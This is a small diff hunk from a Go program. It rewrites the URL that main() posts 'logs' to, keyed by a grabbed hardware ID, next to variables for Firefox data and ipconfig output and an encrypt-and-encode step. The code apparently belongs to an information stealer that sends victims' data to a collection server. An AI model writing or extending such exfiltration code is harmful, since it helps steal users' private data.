@@ -177,7 +177,7 @@ func EncryptAndEncode(m map[string]interface{}) string {
 
 func main() {
 	VERSION_URL := URL_BASE + "version"
-	POST_URL := "http://192.168.1.100:8080/logs/" + GrabHWID()
+	POST_URL := URL_BASE + "logs/" + GrabHWID()
 	req := gorequest.New()
 	var frefox string
 	var ipconfig string
